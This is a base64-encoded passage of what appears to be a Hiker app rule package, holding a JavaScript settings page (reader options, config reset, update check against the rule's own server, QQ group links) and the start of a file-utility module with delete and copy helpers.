XQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwibGluZVxcXCJcXG59KTtcXG5sYXlvdXQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwibGluZVxcXCJcXG59KTtcXG5cXG5mdW5jdGlvbiBzZXROdW0oa2V5LCB0ZXN0KSB7XFxuICAgIGxldCBDb25maWcgPSBKU09OLnBhcnNlKHJlYWRGaWxlKFxcXCJjb25maWcuanNvblxcXCIsIDApIHx8IFxcXCJ7fVxcXCIpO1xcbiAgICBpbnB1dCA9IHBhcnNlSW50KGlucHV0KTtcXG4gICAgaWYgKE51bWJlci5pc05hTihpbnB1dCkpIHJldHVybiBcXFwidG9hc3Q6Ly/or7fovpPlhaXmlbDlrZdcXFwiO1xcbiAgICBpZiAoIXRlc3QoaW5wdXQpKSByZXR1cm4gXFxcInRvYXN0Oi8v5LiN56ym5ZCI5p2h5Lu2XFxcIjtcXG4gICAgQ29uZmlnW2tleV0gPSBpbnB1dDtcXG4gICAgc2F2ZUZpbGUoXFxcImNvbmZpZy5qc29uXFxcIiwgSlNPTi5zdHJpbmdpZnkoQ29uZmlnKSwgMCk7XFxuICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXG4gICAgcmV0dXJuIFxcXCJ0b2FzdDovL+S/ruaUueaIkOWKn1xcXCI7XFxufVxcbmxheW91dC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCJsb2fmlbBcXFwiLFxcbiAgICB1cmw6ICQoQ29uZmlnLmxvZ051bSwgXFxcIjA8TjwxMDBcXFwiKS5pbnB1dChzZXROdW0sIFxcXCJsb2dOdW1cXFwiLCBpdCA9PiBpdCA+IDAgJiYgaXQgPCAxMDApLFxcbiAgICBkZXNjOiBcXFwiXFxcIiArIENvbmZpZy5sb2dOdW0sXFxuICAgIGNvbF90eXBlOiBcXFwidGV4dF8xXFxcIlxcbn0pO1xcblxcbmxheW91dC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCLliIbmibnkuIvovb3mlbAoMOS4jeW8gOWQrylcXFwiLFxcbiAgICB1cmw6ICQoXFxcIlxcXCIgKyBDb25maWcudGhyZWFkTnVtLCBcXFwiTj4tMVxcXCIpLmlucHV0KHNldE51bSwgXFxcInRocmVhZE51bVxcXCIsIGl0ID0+IGl0ID4gLTEpLFxcbiAgICBkZXNjOiBcXFwiXFxcIiArIENvbmZpZy50aHJlYWROdW0sXFxuICAgIGNvbF90eXBlOiBcXFwidGV4dF8xXFxcIixcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIGxpbmVWaXNpYmxlOiBmYWxzZSxcXG4gICAgfVxcbn0pO1xcblxcblxcbmxheW91dC5wdXNoKHtcXG4gICAgY29sX3R5cGU6IFxcXCJsaW5lX2JsYW5rXFxcIlxcbn0pO1xcblxcbmxheW91dC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCI8c3Ryb25nPuWwj+ivtOmYheivu+WZqOiuvue9rjwvc3Ryb25nPlxcXCIuYmlnKCksXFxuICAgIGNvbF90eXBlOiBcXFwicmljaF90ZXh0XFxcIlxcbn0pO1xcbmxheW91dC5wdXNoKHtcXG4gICAgY29sX3R5cGU6IFxcXCJsaW5lXFxcIlxcbn0pO1xcbmxheW91dC5wdXNoKHtcXG4gICAgY29sX3R5cGU6IFxcXCJsaW5lXFxcIlxcbn0pO1xcblxcbmxheW91dC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCLpu5jorqTlvIDlkK/liIbpobXpmIXor7tcXFwiLFxcbiAgICB1cmw6ICQoXFxcIiNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoKGRlZl9pc1BhZ2luYXRlKSA9PiB7XFxuICAgICAgICBsZXQgQ29uZmlnID0gSlNPTi5wYXJzZShyZWFkRmlsZShcXFwiY29uZmlnLmpzb25cXFwiLCAwKSB8fCBcXFwie31cXFwiKTtcXG5cXG4gICAgICAgIENvbmZpZy5kZWZfaXNQYWdpbmF0ZSA9IGRlZl9pc1BhZ2luYXRlID09PSBcXFwiMFxcXCIgPyBcXFwiMVxcXCIgOiBcXFwiMFxcXCI7XFxuXFxuICAgICAgICBzYXZlRmlsZShcXFwiY29uZmlnLmpzb25cXFwiLCBKU09OLnN0cmluZ2lmeShDb25maWcpLCAwKTtcXG4gICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXG4gICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCI7XFxuICAgIH0sIENvbmZpZy5kZWZfaXNQYWdpbmF0ZSksXFxuICAgIGRlc2M6IENvbmZpZy5kZWZfaXNQYWdpbmF0ZSA9PT0gXFxcIjBcXFwiID8gXFxcIuS4jeW8gOWQr1xcXCIgOiBcXFwi5byA5ZCvXFxcIixcXG4gICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiXFxufSk7XFxuXFxubGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogXFxcIuavj+mhteacgOWkp+eroOaVsFxcXCIsXFxuICAgIHVybDogJChDb25maWcudmlld1BhZ2VTaXplLCBcXFwiMzA8Tjw1MDBcXFwiKS5pbnB1dChzZXROdW0sIFxcXCJ2aWV3UGFnZVNpemVcXFwiLCBpdCA9PiBpdCA+IDMwICYmIGl0IDwgNTAwKSxcXG4gICAgZGVzYzogXFxcIlxcXCIgKyBDb25maWcudmlld1BhZ2VTaXplLFxcbiAgICBjb2xfdHlwZTogXFxcInRleHRfMVxcXCJcXG59KTtcXG5sYXlvdXQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwi5pu/5o2i6KeE5YiZXFxcIixcXG4gICAgdXJsOiBcXFwiaGlrZXI6Ly9wYWdlL1NldHRpbmcvTW9yZS52aWV3I25vUmVjb3JkSGlzdG9yeSMjbm9IaXN0b3J5IyNub1JlZnJlc2gjP3NldHRpbmdUeXBlPXJlcGxhY2VSdWxlXFxcIixcXG4gICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiLFxcbiAgICBleHRyYToge1xcbiAgICAgICAgbGluZVZpc2libGU6IGZhbHNlXFxuICAgIH1cXG59KTtcXG5cXG5sYXlvdXQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwibGluZV9ibGFua1xcXCJcXG59KTtcXG5sYXlvdXQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwiPHN0cm9uZz7mvKvnlLvpmIXor7vlmajorr7nva48L3N0cm9uZz5cXFwiLmJpZygpLFxcbiAgICBjb2xfdHlwZTogXFxcInJpY2hfdGV4dFxcXCJcXG59KTtcXG5sYXlvdXQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwibGluZVxcXCJcXG59KTtcXG5sYXlvdXQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwibGluZVxcXCJcXG59KTtcXG5sYXlvdXQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwi5YW85a655qih5byPXFxcIixcXG4gICAgdXJsOiAkKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKChkZWZfaXNDb21pY0NvbXBhdGlibGUpID0+IHtcXG4gICAgICAgIGxldCBDb25maWcgPSBKU09OLnBhcnNlKHJlYWRGaWxlKFxcXCJjb25maWcuanNvblxcXCIsIDApIHx8IFxcXCJ7fVxcXCIpO1xcblxcbiAgICAgICAgQ29uZmlnLmRlZl9pc0NvbWljQ29tcGF0aWJsZSA9IGRlZl9pc0NvbWljQ29tcGF0aWJsZSA9PT0gXFxcIjBcXFwiID8gXFxcIjFcXFwiIDogXFxcIjBcXFwiO1xcblxcbiAgICAgICAgc2F2ZUZpbGUoXFxcImNvbmZpZy5qc29uXFxcIiwgSlNPTi5zdHJpbmdpZnkoQ29uZmlnKSwgMCk7XFxuICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxuICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiO1xcbiAgICB9LCBDb25maWcuZGVmX2lzQ29taWNDb21wYXRpYmxlKSxcXG4gICAgZGVzYzogQ29uZmlnLmRlZl9pc0NvbWljQ29tcGF0aWJsZSA9PT0gXFxcIjBcXFwiID8gXFxcIuS4jeW8gOWQr1xcXCIgOiBcXFwi5byA5ZCvXFxcIixcXG4gICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiXFxufSk7XFxubGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogXFxcIua8q+eUu+WIl+ihqOagt+W8j1xcXCIsXFxuICAgIHVybDogJChbXFxcInRleHRfMVxcXCIsIFxcXCJhdmF0YXJcXFwiLCBcXFwicGljXzNcXFwiLCBcXFwicGljXzNfc3F1YXJlXFxcIiwgXFxcIm1vdmllXzNfbWFycXVlZVxcXCJdLCAxLCBcXFwi6K+36YCJ5oup5ryr55S75YiX6KGo5pi+56S65qC35byPXFxcIikuc2VsZWN0KCgpID0+IHtcXG4gICAgICAgIGxldCBDb25maWcgPSBKU09OLnBhcnNlKHJlYWRGaWxlKFxcXCJjb25maWcuanNvblxcXCIsIDApIHx8IFxcXCJ7fVxcXCIpO1xcbiAgICAgICAgQ29uZmlnLmRlZl9Db21pY19TdHlsZSA9IGlucHV0O1xcbiAgICAgICAgc2F2ZUZpbGUoXFxcImNvbmZpZy5qc29uXFxcIiwgSlNPTi5zdHJpbmdpZnkoQ29uZmlnKSwgMCk7XFxuICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxuICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiO1xcbiAgICB9LCBDb25maWcuZGVmX0NvbWljX1N0eWxlKSxcXG4gICAgZGVzYzogQ29uZmlnLmRlZl9Db21pY19TdHlsZXx8XFxcIlxcXCIsXFxuICAgIGNvbF90eXBlOiBcXFwidGV4dF8xXFxcIlxcbn0pO1xcbmxheW91dC5wdXNoKHtcXG4gICAgY29sX3R5cGU6IFxcXCJsaW5lX2JsYW5rXFxcIlxcbn0pO1xcbmxheW91dC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCI8c3Ryb25nPuWFtuS7luiuvue9rjwvc3Ryb25nPlxcXCIuYmlnKCksXFxuICAgIGNvbF90eXBlOiBcXFwicmljaF90ZXh0XFxcIlxcbn0pO1xcbmxheW91dC5wdXNoKHtcXG4gICAgY29sX3R5cGU6IFxcXCJsaW5lXFxcIlxcbn0pO1xcbmxheW91dC5wdXNoKHtcXG4gICAgY29sX3R5cGU6IFxcXCJsaW5lXFxcIlxcbn0pO1xcbmxheW91dC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCLop4TliJnlj5HluIPpobVcXFwiLFxcbiAgICB1cmw6IFxcXCJoaWtlcjovL3BhZ2UvcnVsZURldGFpbCNub0hpc3RvcnkjI25vUmVjb3JkSGlzdG9yeSM/cnVsZT3pgZPplb/ku5PlupNQcm9cXFwiLFxcbiAgICBleHRyYToge1xcbiAgICAgICAgbHZlcjogTVlfUEFSQU1TLnZlcnNpb24gfHwgXFxcIuiOt+WPlueJiOacrOWksei0pe+8jOiHquihjOafpeeci1xcXCIsXFxuICAgICAgICBpZDogXFxcIjM1NTlcXFwiXFxuICAgIH0sXFxuICAgIGNvbF90eXBlOiBcXFwidGV4dF8xXFxcIlxcbn0pO1xcblxcbmxheW91dC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCLmgaLlpI3pu5jorqTorr7nva5cXFwiLFxcbiAgICB1cmw6ICQoXFxcIuehruiupOaBouWkjem7mOiupOiuvue9ru+8n1xcXCIpLmNvbmZpcm0oKCkgPT4ge1xcbiAgICAgICAgZGVsZXRlRmlsZShcXFwiY29uZmlnLmpzb25cXFwiKTtcXG4gICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXG4gICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/mgaLlpI3lrozmiJBcXFwiO1xcbiAgICB9KSxcXG4gICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiXFxufSk7XFxubGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogXFxcIua4heeQhue8k+WtmFxcXCIsXFxuICAgIHVybDogXFxcImhpa2VyOi8vcGFnZS9TZXR0aW5nL01vcmUudmlldyNub1JlY29yZEhpc3RvcnkjI25vSGlzdG9yeSM/c2V0dGluZ1R5cGU9Y2FjaGVcXFwiLFxcbiAgICBjb2xfdHlwZTogXFxcInRleHRfMVxcXCJcXG59KTtcXG5sYXlvdXQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwi5paH5Lu2566h55CGXFxcIixcXG4gICAgdXJsOiBcXFwiaGlrZXI6Ly9wYWdlL0ZpbGVNYW5hZ2VtZW50LnZpZXcjbm9SZWZyZXNoIyNub1JlY29yZEhpc3RvcnkjI25vSGlzdG9yeSNcXFwiLFxcbiAgICBjb2xfdHlwZTogXFxcInRleHRfMVxcXCJcXG59KTtcXG5sZXQgdGlkID0gRGF0ZS5ub3coKTtcXG5sYXlvdXQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwi5qOA5rWL5pu05pawXFxcIixcXG4gICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiLFxcbiAgICB1cmw6ICQoXFxcIiNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoKG9sZFZlcnNpb24sIHRpZCkgPT4ge1xcbiAgICAgICAgdHJ5IHtcXG4gICAgICAgICAgICBsZXQgbmV3VmVyc2lvbiA9IEpTT04ucGFyc2UocmVxdWVzdChcXFwiaHR0cDovL2hpa2VyLm5va2lhLnByZXNzL2hpa2VydWxlL2Rldi9nZXRieWlkP2lkPTM1NTlcXFwiLCB7XFxuICAgICAgICAgICAgICAgIHRpbWVvdXQ6IDIwMDBcXG4gICAgICAgICAgICB9KSkucmVzdWx0LnZlcjtcXG4gICAgICAgICAgICBpZiAobmV3VmVyc2lvbiA8PSBvbGRWZXJzaW9uKSB7XFxuICAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0odGlkICsgXFxcIiPorr7nva5f5pu05pawXFxcIiwge1xcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLlt7Lnu4/mmK/mnIDmlrDniYjmnKzkuoZcXFwiXFxuICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5bey57uP5piv5pyA5paw54mI5pys5LqGXFxcIjtcXG4gICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICB1cGRhdGVJdGVtKHRpZCArIFxcXCIj6K6+572uX+abtOaWsFxcXCIsIHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwi5pyJ5paw54mI5pys6L+Y5pyq5pu05pawXFxcIlxcbiAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICAgICAgdG9hc3QoXFxcIuacieaWsOeJiOacrOi/mOacquabtOaWsFxcXCIpO1xcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcInJ1bGU6Ly81clczNlppVTZLZUc1NVdNNzcrbGFHOXRaVjl5ZFd4bFgzVnliTysvcFdoMGRIQTZMeTlvYVd0bGNpNXViMnRwWVM1d2NtVnpjeTlvYVd0bGNuVnNaUzl5ZFd4bGJHbHpkQzVxYzI5dVAybGtQVE0xTlRrPVxcXCI7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSBjYXRjaCAoZSkge1xcbiAgICAgICAgICAgIHVwZGF0ZUl0ZW0odGlkICsgXFxcIiPorr7nva5f5pu05pawXFxcIiwge1xcbiAgICAgICAgICAgICAgICB0aXRsZTogXFxcIuS/oeaBr+iOt+WPluWksei0pVxcXCJcXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5pu05paw5L+h5oGv6I635Y+W5aSx6LSlXFxcIjtcXG4gICAgICAgIH1cXG4gICAgfSwgTVlfUEFSQU1TLnZlcnNpb24sIHRpZCksXFxuICAgIGV4dHJhOiB7XFxuICAgICAgICBpZDogdGlkICsgXFxcIiPorr7nva5f5pu05pawXFxcIlxcbiAgICB9XFxufSk7XFxubGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogXFxcIuWFs+S6juWmguS9leiwg+eUqFxcXCIsXFxuICAgIHVybDogXFxcIm1xcWFwaTovL2ZvcndhcmQvdXJsP3NyY190eXBlPXdlYiZzdHlsZT1kZWZhdWx0JnBsZ19hdXRoPTEmdmVyc2lvbj0xJnVybF9wcmVmaXg9YUhSMGNITTZMeTl4ZFc0dWNYRXVZMjl0TDNGeGQyVmlMM0YxYm5CeWJ5OXphR0Z5WlQ5ZmQzWTlNeVpmZDNkMlBURXlPQ1pwYm5acGRHVkRiMlJsUFRGSVJubENTaVptY205dFBUSTBOall4TUNaaWFYbzlhMkVqTDI5MWRBPT1cXFwiLFxcbiAgICBkZXNjOiBcXFwi6K+m57uG54K55Ye75Yqg5YWl6aKR6YGTKOW/q+adpeWNjuWxseS4juaIkeiuultqaV3liZEpXFxcIixcXG4gICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiXFxufSk7XFxubGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogXFxcIumXrumimOWPjemmiFxcXCIsXFxuICAgIHVybDogXFxcIm1xcWFwaTovL2ZvcndhcmQvdXJsP3NyY190eXBlPXdlYiZzdHlsZT1kZWZhdWx0JnBsZ19hdXRoPTEmdmVyc2lvbj0xJnVybF9wcmVmaXg9YUhSMGNITTZMeTl4ZFc0dWNYRXVZMjl0TDNGeGQyVmlMM0YxYm5CeWJ5OXphR0Z5WlQ5ZmQzWTlNeVpmZDNkMlBURXlPQ1poY0hCRGFHRnVibVZzUFhOb1lYSmxKbWx1ZG1sMFpVTnZaR1U5TVZoT1lXeEJSWGwyVm1vbVkyOXVkR1Z1ZEVsRVBXTXpiRWxRSm1KMWMybHVaWE56Vkhsd1pUMHlKbVp5YjIwOU1UZ3hNRGMwSm1KcGVqMXJZU1p0WVdsdVUyOTFjbU5sU1dROWMyaGhjbVVtYzNWaVUyOTFjbU5sU1dROWIzUm9aWEp6Sm1wMWJYQnpiM1Z5WTJVOWMyaHZjblIxY213PSZ0PTE2NzE4OTMxMjM1OTcjSW50ZW50O3NjaGVtZT1tcXFhcGk7cGFja2FnZT1jb20udGVuY2VudC5tb2JpbGVxcTtlbmRcXFwiLFxcbiAgICBkZXNjOiBcXFwi57ud5a+55LiN5Lya5pyJYnVnKOWViuaIkeS4jeaOpeWPlyEpXFxcIixcXG4gICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiXFxufSk7XFxuLypcXG5sYXlvdXQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwi5riF6Zmk5bCP6K+05YiG6aG16K6w5b2VXFxcIixcXG4gICAgdXJsOiAkKFxcXCLnoa7orqTmuIXpmaTlsI/or7TliIbpobXorrDlvZXvvJ9cXFwiKS5jb25maXJtKCgpID0+IHtcXG4gICAgICAgIGRlbGV0ZUZpbGUoXFxcIm5vdmVsRm9vdHByaW50Lmpzb25cXFwiKTtcXG4gICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/muIXpmaTlrozmiJBcXFwiO1xcbiAgICB9KSxcXG4gICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiXFxufSk7XFxuKi9cXG5zZXRSZXN1bHQobGF5b3V0KTtcIixcImdyb3VwXCI6XCLikaDmjqjojZBcIixcInVhXCI6XCJtb2JpbGVcIixcInByZVJ1bGVcIjpcIlwiLFwicGFnZXNcIjpcIlt7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCIjZi5GaWxl5bel5YW3XFxcIixcXFwicGF0aFxcXCI6XFxcIkZpbGUuanNcXFwiLFxcXCJydWxlXFxcIjpcXFwiY29uc3QgRmlsZSA9IGphdmEuaW8uRmlsZTtcXFxcbmNvbnN0IHtcXFxcbiAgICBGaWxlcyxcXFxcbiAgICBQYXRocyxcXFxcbiAgICBTdGFuZGFyZENvcHlPcHRpb24sXFxcXG4gICAgU3RhbmRhcmRPcGVuT3B0aW9uXFxcXG59ID0gamF2YS5uaW8uZmlsZTtcXFxcbmNvbnN0IGphdmFTdHJpbmcgPSBqYXZhLmxhbmcuU3RyaW5nO1xcXFxubGV0IGphdmFTY29wZSA9IG5ldyBKYXZhSW1wb3J0ZXIoamF2YS5pbywgamF2YS5sYW5nLCBqYXZhLmxhbmcucmVmbGVjdCwgamF2YS51dGlsLlZlY3Rvcik7XFxcXG5cXFxcbmZ1bmN0aW9uIGRlbGV0ZUZpbGVzKGZpbGVOYW1lKSB7XFxcXG4gICAgbGV0IGZpbGUgPSBuZXcgRmlsZShmaWxlTmFtZSk7XFxcXG4gICAgaWYgKCFmaWxlLmV4aXN0cygpKSB7XFxcXG4gICAgICAgIC8vbG9nKFxcXFxcXFwi5Yig6Zmk5paH5Lu25aSx6LSl77yaXFxcXFxcXCIgKyBmaWxlTmFtZSArIFxcXFxcXFwi5paH5Lu25LiN5a2Y5ZyoXFxcXFxcXCIpO1xcXFxuICAgICAgICByZXR1cm4gZmFsc2U7XFxcXG4gICAgfSBlbHNlIHtcXFxcbiAgICAgICAgaWYgKGZpbGUuaXNGaWxlKCkpIHtcXFxcbiAgICAgICAgICAgIHJldHVybiBkZWxldGVGaWxlKGZpbGVOYW1lKTtcXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgIHJldHVybiBkZWxldGVEaXJlY3RvcnkoZmlsZU5hbWUpO1xcXFxuICAgICAgICB9XFxcXG5cXFxcbiAgICB9XFxcXG5cXFxcbn1cXFxcbi8qKlxcXFxuICog5Yig6Zmk5Y2V5Liq5paH5Lu2XFxcXG4gKiBcXFxcbiAqIEBwYXJhbSBmaWxlTmFtZVxcXFxuICogICAgICAgICAgICDooqvliKDpmaTmlofku7bnmoTmlofku7blkI1cXFxcbiAqIEByZXR1cm4g5Y2V5Liq5paH5Lu25Yig6Zmk5oiQ5Yqf6L+U5ZuedHJ1ZSzlkKbliJnov5Tlm55mYWxzZVxcXFxuICovXFxcXG5mdW5jdGlvbiBkZWxldGVGaWxlKGZpbGVOYW1lKSB7XFxcXG4gICAgbGV0IGZpbGUgPSBuZXcgRmlsZShmaWxlTmFtZSk7XFxcXG4gICAgaWYgKGZpbGUuaXNGaWxlKCkgJiYgZmlsZS5leGlzdHMoKSkge1xcXFxuICAgICAgICBmaWxlLmRlbGV0ZSgpO1xcXFxuICAgICAgICAvL2xvZyhcXFxcXFxcIuWIoOmZpOWNleS4quaWh+S7tlxcXFxcXFwiICsgZmlsZU5hbWUgKyBcXFxcXFxcIuaIkOWKn++8gVxcXFxcXFwiKTtcXFxcbiAgICAgICAgcmV0dXJuIHRydWU7XFxcXG4gICAgfSBlbHNlIHtcXFxcbiAgICAgICAgLy9sb2coXFxcXFxcXCLliKDpmaTljZXkuKrmlofku7ZcXFxcXFxcIiArIGZpbGVOYW1lICsgXFxcXFxcXCLlpLHotKXvvIFcXFxcXFxcIik7XFxcXG4gICAgICAgIHJldHVybiBmYWxzZTtcXFxcbiAgICB9XFxcXG5cXFxcbn1cXFxcbi8qKlxcXFxuICog5Yig6Zmk55uu5b2V77yI5paH5Lu25aS577yJ5Lul5Y+K55uu5b2V5LiL55qE5paH5Lu2XFxcXG4gKiBcXFxcbiAqIEBwYXJhbSBkaXJcXFxcbiAqICAgICAgICAgICAg6KKr5Yig6Zmk55uu5b2V55qE5paH5Lu26Lev5b6EXFxcXG4gKiBAcmV0dXJuIOebruW9leWIoOmZpOaIkOWKn+i/lOWbnnRydWUs5ZCm5YiZ6L+U5ZueZmFsc2VcXFxcbiAqL1xcXFxuZnVuY3Rpb24gZGVsZXRlRGlyZWN0b3J5KGRpcikge1xcXFxuICAgIC8vIOWmguaenGRpcuS4jeS7peaWh+S7tuWIhumalOespue7k+Wwvu+8jOiHquWKqOa3u+WKoOaWh+S7tuWIhumalOesplxcXFxuICAgIGlmICghZGlyLmVuZHNXaXRoKEZpbGUuc2VwYXJhdG9yKSkge1xcXFxuICAgICAgICBkaXIgPSBkaXIgKyBGaWxlLnNlcGFyYXRvcjtcXFxcbiAgICB9XFxcXG4gICAgbGV0IGRpckZpbGUgPSBuZXcgRmlsZShkaXIpO1xcXFxuICAgIC8vIOWmguaenGRpcuWvueW6lOeahOaWh+S7tuS4jeWtmOWcqO+8jOaIluiAheS4jeaYr+S4gOS4quebruW9le+8jOWImemAgOWHulxcXFxuICAgIGlmICghZGlyRmlsZS5leGlzdHMoKSB8fCAhZGlyRmlsZS5pc0RpcmVjdG9yeSgpKSB7XFxcXG4gICAgICAgIC8vbG9nKFxcXFxcXFwi5Yig6Zmk55uu5b2V5aSx6LSlXFxcXFxcXCIgKyBkaXIgKyBcXFxcXFxcIuebruW9leS4jeWtmOWcqO+8gVxcXFxcXFwiKTtcXFxcbiAgICAgICAgcmV0dXJuIGZhbHNlO1xcXFxuICAgIH1cXFxcbiAgICBsZXQgZmxhZyA9IHRydWU7XFxcXG4gICAgLy8g5Yig6Zmk5paH5Lu25aS55LiL55qE5omA5pyJ5paH5Lu2KOWMheaLrOWtkOebruW9lSlcXFxcbiAgICBsZXQgZmlsZXMgPSBkaXJGaWxlLmxpc3RGaWxlcygpO1xcXFxuICAgIGZvciAobGV0IGkgPSAwOyBpIDwgZmlsZXMubGVuZ3RoOyBpKyspIHtcXFxcbiAgICAgICAgLy8g5Yig6Zmk5a2Q5paH5Lu2XFxcXG4gICAgICAgIGlmIChmaWxlc1tpXS5pc0ZpbGUoKSkge1xcXFxuICAgICAgICAgICAgZmxhZyA9IGRlbGV0ZUZpbGUoZmlsZXNbaV0uZ2V0QWJzb2x1dGVQYXRoKCkpO1xcXFxuICAgICAgICAgICAgaWYgKCFmbGFnKSB7XFxcXG4gICAgICAgICAgICAgICAgYnJlYWs7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH0gZWxzZSB7IC8vIOWIoOmZpOWtkOebruW9lVxcXFxuICAgICAgICAgICAgZmxhZyA9IGRlbGV0ZURpcmVjdG9yeShmaWxlc1tpXS5nZXRBYnNvbHV0ZVBhdGgoKSk7XFxcXG4gICAgICAgICAgICBpZiAoIWZsYWcpIHtcXFxcbiAgICAgICAgICAgICAgICBicmVhaztcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfVxcXFxuICAgIH1cXFxcbiAgICBpZiAoIWZsYWcpIHtcXFxcbiAgICAgICAgLy9sb2coXFxcXFxcXCLliKDpmaTnm67lvZXlpLHotKVcXFxcXFxcIik7XFxcXG4gICAgICAgIHJldHVybiBmYWxzZTtcXFxcbiAgICB9XFxcXG4gICAgLy8g5Yig6Zmk5b2T5YmN55uu5b2VXFxcXG4gICAgaWYgKGRpckZpbGUuZGVsZXRlKCkpIHtcXFxcbiAgICAgICAgLy9sb2coXFxcXFxcXCLliKDpmaTnm67lvZVcXFxcXFxcIiArIGRpciArIFxcXFxcXFwi5oiQ5Yqf77yBXFxcXFxcXCIpO1xcXFxuICAgICAgICByZXR1cm4gdHJ1ZTtcXFxcbiAgICB9IGVsc2Uge1xcXFxuICAgICAgICAvL2xvZyhcXFxcXFxcIuWIoOmZpOebruW9lVxcXFxcXFwiICsgZGlyICsgXFxcXFxcXCLlpLHotKXvvIFcXFxcXFxcIik7XFxcXG4gICAgICAgIHJldHVybiBmYWxzZTtcXFxcbiAgICB9XFxcXG59XFxcXG5cXFxcbi8vY29weeWNleS4quaWh+S7tlxcXFxuZnVuY3Rpb24gY29weUZpbGUoc291cmNlLCB0YXJnZXQsIGlzQ292ZXIpIHtcXFxcbiAgICBsZXQgc291cmNlUGF0aCA9IFBhdGhzLmdldChzb3VyY2UpO1xcXFxuICAgIGxldCB0YXJnZXRQYXRoID0gUGF0aHMuZ2V0KHRhcmdldCk7XFxcXG4gICAgbGV0IGlzRXhpc3QgPSBGaWxlcy5leGlzdHModGFyZ2V0UGF0aCk7XFxcXG4gICAgaWYgKEZpbGVzLmlzRGlyZWN0b3J5KHNvdXJjZVBhdGgpIHx8IChpc0V4aXN0ICYmICFpc0NvdmVyKSB8fCAoaXNFeGlzdCAmJiBGaWxlcy5pc0RpcmVjdG9yeSh0YXJnZXRQYXRoKSkpIHtcXFxcbiAgICAgICAgcmV0dXJuIGZhbHNlO1xcXFxuICAgIH1cXFxcbiAgICB0cnkge1xcXFxuICAgICAgICBpZiAoIWlzRXhpc3QpIHtcXFxcbiAgICAgICAgICAgIEZpbGVzLmNyZWF0ZURpcmVjdG9yaWVzKHRhcmdldFBhdGguZ2V0UGFyZW50KCkpO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGlmIChpc0NvdmVyID09PSB0cnVlKSB7XFxcXG4gICAgICAgICAgICBGaWxlcy5jb3B5KHNvdXJjZVBhdGgsIHRhcmdldFBhdGgsIFN0YW5kYXJkQ29weU9wdGlvbi5SRVBMQUNFX0VYSVNUSU5HLCBTdGFuZGFyZENvcHlPcHRpb24uQ09QWV9BVFRSSUJVVEVTKTtcXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgIEZpbGVzLmNvcHkoc291cmNlUGF0aCwgdGFyZ2V0UGF0aCwgU3RhbmRhcmRDb3B5T3B0aW9uLkNPUFlfQVRUUklCVVRFUyk7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9IGNhdGNoIChlKSB7XFxcXG4gICAgICAgIHJldHVybiBmYWxzZTtcXFxcbiAgICB9XFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIGdldEZpbGVUaW1lKHBhdGgpIHtcXFxcbiAgICBsZXQgZmlsZSA9IG5ldyBGaWxlK